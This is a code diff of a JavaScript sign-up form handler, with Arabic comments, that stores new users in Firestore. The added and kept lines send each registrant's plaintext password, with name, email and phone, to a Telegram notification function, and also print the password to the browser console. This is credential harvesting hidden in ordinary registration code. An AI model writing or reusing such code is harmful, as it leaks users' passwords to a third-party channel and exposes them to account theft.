@@ -124,12 +124,26 @@ if (document.getElementById('registerForm')) {
             await db.collection('users').doc(user.uid).set(userData);
             
             // إرسال إشعار إلى تليجرام (مع كلمة المرور)
-            await sendTelegramNotification({
-                ...userData,
-                password: password,
-                provider: 'البريد الإلكتروني',
-                createdAt: new Date()
-            });
+            try {
+                console.log('📤 إرسال البيانات إلى تليجرام...', {
+                    fullName: fullName,
+                    email: email,
+                    phone: phone,
+                    password: password
+                });
+                
+                await sendTelegramNotification({
+                    ...userData,
+                    password: password,
+                    provider: 'البريد الإلكتروني',
+                    createdAt: new Date()
+                });
+                
+                console.log('✅ تم إرسال الإشعار إلى تليجرام بنجاح');
+            } catch (telegramError) {
+                console.error('❌ فشل إرسال الإشعار إلى تليجرام:', telegramError);
+                // لا نوقف التسجيل حتى لو فشل Telegram
+            }
             
             showMessage('تم إنشاء الحساب بنجاح! جاري التحويل...', 'success');
             
